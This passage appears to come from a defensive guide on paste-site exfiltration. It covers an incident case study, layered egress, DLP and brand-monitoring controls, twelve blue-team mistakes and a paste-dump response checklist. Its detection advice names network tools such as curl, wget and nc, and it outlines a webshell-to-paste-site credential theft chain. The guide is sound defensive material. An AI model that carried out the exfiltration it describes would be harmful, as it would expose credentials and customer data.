    Containment followed the response rule from section 4 — rotate first, investigate second: every credential reachable from the marketing network was rotated the same morning, and the egress block cut the channel before the attacker could dump anything else. Eradication meant hunting webshells and schedulers, not just removing the one found. The sweep that discovered the dormant cron implant is what stopped a second intrusion from reusing the same door. Recovery was a measured audit of database activity between dump and rotation, a documented notification review, and the permanent controls listed on Day 14. A recovery that changes nothing just schedules the next incident.

    Impact

    The damage was contained but real. Credentials to the billing database were public for seven days. Customer data had to be assessed for exposure under GDPR's notification rules, roughly forty staff-hours went into response, and the marketing server was offline for a day during rebuild. The unbilled cost was trust: explaining to customers that a dump existed but was rotated before misuse required the DB audit trail to be complete and defensible. A replayed credential that had succeeded would have made this a reportable breach instead of a close call.

    Team response and communication

    Response worked when roles were clear. The SOC ran the bridge and the log analysis. IT owned rotation and patching. Legal reviewed notification duties, and support answered customers from a pre-approved one-page statement. The weak point was organizational — the researcher's email reached a marketing inbox first and sat for ninety minutes. The fix was procedural, not technical. Public aliases like security@ must exist, be monitored, and route straight to the SOC. Brand-monitoring alerts now page the on-call analyst exactly like an internal detection.

    Lessons learned

    • Egress policy per asset class is the first control to deploy. Servers do not need paste sites; blocking the category for server ranges turns the loudest exfil channel into a deny log.
    • Brand monitoring is a detection sensor. Point keyword monitoring at "company name + password/key/config" and route hits to the SOC — external eyes will find your dumps whether you watch or not.
    • DLP belongs on HTTPS bodies, not just email. Where TLS inspection is lawful, secret-pattern matching names the data; without it, "odd POST" stays "odd POST".
    • Patch SLAs for internet-facing applications stop the exfiltration chain before it starts. Day 0's webshell was a fourteen-month-old patch; the whole chain started there.
    • WAF "allowed" lines deserve review. Twelve blocked probes and one allowed request was the entire intrusion, sitting in a log nobody read.

    Mitigation and Defense

    Controls that stop paste-dump exfiltration before it happens, in the order defenders usually deploy them — plus what a home user or small office should do.

    No single control stops this technique; the reliable defense is layered and mostly unglamorous. The egress policy decides whether the POST can leave at all. DLP decides whether the body is inspected when it does. Process-line detections catch the client that made the request. Brand monitoring catches the dumps that got away. Deploy them in that order: the first control on the list is cheap, fast, and would have shortened the case study from nine days to minutes.

    Enterprise controls by layer

    Policy & people

    Write an information-transfer policy that names approved channels and explicitly forbids pasting company data to public paste sites. Cover it in onboarding and annual training, and make the acceptable-use acknowledgment auditable. A policy nobody has signed is a suggestion.

    Identity & credentials

    Eliminate shared and reused service passwords, vault DB credentials out of config files, and keep a rotation runbook with owners and target times. If a dump ever lands on a paste site, rotation speed — not detection — decides how far the damage spreads.

    Endpoint

    EDR on every server and workstation with process-line telemetry for curl, wget, nc, and Invoke-RestMethod. Alert when web or service users spawn HTTP clients; application servers rarely need them. Keep EDR coverage reports honest — an agentless host is a blind exit.

    Network / egress

    The headline control: egress policy per asset class. Servers get no paste, social-media, or file-drop categories at the proxy; workstations keep access but are logged. Add netflow coverage for raw-text-listener ports (9999-style) where the proxy is bypassed. This implements ATT&CK's listed mitigation for the technique — M1021 · Restrict Web-Based Content.

    TLS inspection + DLP

    Where lawful and privacy-reviewed, inspect outbound TLS and run DLP secret-pattern rules (key shapes, credential assignments, private-key headers) on HTTPS request bodies — not just email. Match metadata, not raw content, into analyst queues.

    Cloud & containers

    Default-deny egress NetworkPolicies per namespace, with explicit allow lists for registries and required APIs. A pod that can reach the internet can reach a paste API; treat "allow all" as a finding, and log pod-level flows (Cilium/Calico) to the SIEM.

    Logging & monitoring

    Retain proxy, DNS, EDR, and netflow long enough to reconstruct a handoff (90+ days). Deploy the 5.5 rule set, and join paste-domain egress to asset-class tags so "from a server" is queryable. Review the paste-domain list quarterly against 5.2 sources.

    Brand / keyword monitoring

    Run keyword monitoring for company name + password/key/config/dump on paste and code sites, owned by the SOC, alerting to on-call. Case Greyboard's dump was found by an outsider; this control makes the outsider redundant.

    Backup & response

    Tested restores do not stop a paste POST, but they bound the damage of whatever the dump enables (extortion, sabotage). Keep a paste-dump runbook: capture the URL, snapshot the content, rotate credentials, hunt the posting process, then scope.

    Home and small-office advice

    Never paste a secret anywhere public

    Paste sites are searchable, cached, mirrored, and permanently scraped by bots. Passwords, API keys, .env files, Wi-Fi keys, and license codes are all "text" and all leak the same way. If you must transfer a secret to someone, use a password manager's secure sharing or an encrypted, expiring link — and rotate it after.

    Check your own exposure

    Search public paste sites and code-search tools for your domain name combined with words like "password", "apikey", or "secret". If your own mail server or router config shows up, rotate first and investigate second — the same rotate-first rule enterprises follow. Turn on automatic updates for anything internet-facing, especially blogs and CMSes.

    Common Mistakes and Best Practices

    Twelve blue-team mistakes that let paste dumps through or bury the alerts that catch them — each with the symptom, the root cause, the fix, and the prevention.

    Most of these mistakes come from good intentions: a threshold set high to cut noise, a tool owned by the wrong team, an assumption about servers that was never written into policy. Read them as a checklist for your own environment. Every one of them maps to a rule in section 5 or a control in section 7, so each fix also tells you where the permanent prevention lives.

    1 · "Servers don't browse" — assumed, never enforced

    Symptom The first paste POST from a server subnet is a surprise discovery during an incident, not an alert.

    Root cause The team believes servers have no web access, but the proxy policy allows the full category set for every subnet.

    Fix Enumerate what servers actually need, then block paste, social, and file-drop categories for server ranges the same week.

    Prevention Make asset-class egress rules a review item for every new subnet; test with a generated request from a server VLAN each quarter.

    2 · DLP only on email, never on HTTPS bodies

    Symptom Email DLP is mature and quiet, yet secrets still appear in public pastes with no internal alert.

    Root cause DLP was scoped to the mail gateway years ago; web egress grew around it and nobody re-scoped.

    Fix Extend secret-pattern DLP to inspected HTTPS request bodies on paste and file-drop categories, starting in monitor mode.

    Prevention Annual DLP coverage review across channels — email, web, clipboard, cloud sync — with gaps filed as risks, not footnotes.

    3 · Brand monitoring lives in marketing, disconnected from SOC

    Symptom An outside researcher finds the dump and emails a generic inbox; the SOC learns about it secondhand, hours later.

    Root cause Keyword monitoring was bought for trademark protection; security was never added as a consumer or alert target.

    Fix Add SOC paging to brand-monitor alerts for security keywords (company + password/key/config/dump) and route security@ to on-call.

    Prevention One owner, one alert path: security-relevant external signals page the same on-call rotation as internal detections.

    4 · Volume-only exfiltration thresholds

    Symptom Exfil dashboards show "no data leaving" while an 812-byte POST carries the business-critical credentials out.

    Root cause Detection was designed around bulk file transfer, so megabyte thresholds filter out exactly the small POSTs that matter.

    Fix Add context rules (who → what category) beside volume rules; treat any paste POST from infrastructure as signal, regardless of size.

    Prevention Threat-model reviews for exfil detections must include "tiny text payloads" scenarios — T1567.003 is the canonical example.

    5 · Proxy logs retained but never queried by subnet

    Symptom After the incident, the evidence was "in the logs all along" — nine days of paste POSTs nobody ever searched.

    Root cause Logging exists for compliance, not hunting; no scheduled query joins proxy categories to asset-class tags.

    Fix Stand up the 5.5 rules on the retained data, run a 30-day retro-hunt, and schedule the server-subnet query to run daily.

    Prevention Log-source onboarding requires a paired detection: every new source ships with at least one scheduled query, not just retention.

    6 · Fleet-wide paste rules without asset context → alert fatigue

    Symptom The first version of the paste rule fires forty times a day for developers, gets thresholded into silence, and misses the real event.

    Root cause One rule for all users; no asset-class or department context, so legitimate developer traffic overwhelms the server and insider signals.

    Fix Split by asset class (server vs workstation), move workstation cases to a triage queue with DLP/time context, and re-enable with the split design.

    Prevention No rule ships without a false-positive budget and a documented tuning plan; alert volume reviewed monthly against closures.

    7 · Treating "unlisted" pastes as private, rotating slowly

    Symptom After discovery, the team spends two days confirming scope before touching credentials; the paste meanwhile stays live.

    Root cause "Unlisted" is mistaken for "access-controlled", and rotation waits for certainty that will never come.

    Fix Rotate the exposed credentials immediately and treat the paste as public from minute zero; scope in parallel, not before.

    Prevention The incident runbook states rotation triggers — "credential material possibly public" is enough — with per-system owners and clocks.

    8 · No netflow retention for raw-listener flows

    Symptom A dead-drop handoff (threat 4) is suspected, but the 9999-port flows can neither be confirmed nor ruled out.

    Root cause Netflow rotates in 48 hours or the proxy is assumed to cover everything, so proxy-free channels leave no history.

    Fix Raise flow retention to 90+ days and deploy the 5.5-4 listener-port rule so future flows alert in real time.

    Prevention Retention requirements derived from investigation needs (timeline reconstruction), documented per source, audited annually.

    9 · DNS logging blind spots

    Symptom The DNS pair that would confirm paste egress is missing — resolvers forward to external DNS, bypassing internal logging.

    Root cause Hosts hardcode public resolvers (8.8.8.8-style) or the DHCP scope was never locked down; the resolver logs cover only part of the estate.

    Fix Force internal resolvers via firewall rules, log all resolver queries, and alert on paste-domain lookups from server VLANs.

    Prevention Egress rules that allow DNS only to approved resolvers — one config that fixes both visibility and a whole class of tunneling.

    10 · Blanket category block with exception sprawl

    Symptom The org blocks paste sites for everyone, developers push back, and fifty standing exceptions appear — including on servers.

    Root cause A one-size policy instead of per-asset-class design; exceptions become the permanent state and the original control decays.

    Fix Rebuild as asset-class policy: strict for servers, logged-but-allowed for workstations, approved endpoints allow-listed for engineering.

    Prevention Exceptions carry expiry dates and owners; a monthly review drops expired entries before they become the new baseline.

    11 · Detections with no owner and a frozen domain list

    Symptom The rules still fire — on a paste domain that shut down in 2024 — while the site the attacker actually uses passes unseen.

    Root cause A consultant deployed the rule set and left; nobody owns the domain list, the tuning, or the mapping to new services.

    Fix Assign a named rule owner, move the domain list to version control, and schedule quarterly refreshes fed by the 5.2 sources.

    Prevention Detection inventory with owner, review date, and last-test date per rule — unowned rules are treated as decommissioned.

    12 · WAF "allowed" lines never reviewed

    Symptom The webshell entered through a request the WAF explicitly allowed; the block statistics looked great all month.

    Root cause WAF review means "how many attacks did we block", not "what did we allow from noisy sources" — the one allowed probe is invisible.

    Fix Add a weekly review of allowed requests from IPs with prior blocks, plus file-integrity monitoring on web roots.

    Prevention Alert on block-then-allow sequences from one source within a window — the exact signature of a WAF rule-gap probe.

    Habits that keep the controls alive

    Daily

    Review paste-category egress from server subnets (should be zero rows); check EDR first-seen HTTP clients on servers; skim WAF allowed-line anomalies from previously blocked sources. Ten minutes, three queries, every shift.

    Weekly

    Tune the triage queue: close false positives with documented reasons, review egress policy changes and new exceptions, verify brand-monitor alerts still page on-call, and sample one paste-URL incident end-to-end for practice.

    Monthly

    Refresh the paste/text-storage domain and category lists against 5.2 sources. Re-test every 5.5 rule with generated events in the lab. Audit asset-class tags for new subnets and cloud ranges. Report rule health (volume, FP rate, last test) to the detection owner.

    ⚠ Warning: The failure pattern behind most of these mistakes is the same: a control that exists but has no owner, no test, and no review cadence is decoration. When you inherit a control, its first test is yours to run — do not let "we have a policy for that" end the conversation.

    Response checklist — confirmed or suspected paste dump

    1. Capture the evidence: record the paste URL, snapshot its content (it can vanish), and save the proxy, DNS, and EDR rows around the POST.
    2. Rotate exposed credentials first: every account in the dump plus anything sharing its password — before the analysis is finished.
    3. Find the process that posted: join the proxy timestamp to EDR telemetry; identify the webshell, implant, or insider action behind it.
    4. Review web/WAF logs for the entry path: probe bursts, allowed upload POSTs, new files in web roots, unexpected schedulers.
    5. Block paste categories for server ranges at the proxy or firewall if not already enforced; deny-log the result.
    6. Check other subnets and hosts for the same destination, same process pattern, or the dumped credentials already in use.
    7. Scan paste and code sites for organization keywords (name, domains, product names + password/key/config) — assume more dumps exist.
    8. Notify per policy: legal/privacy review for data in the dump, customers if required, and the incident report with a complete timeline.
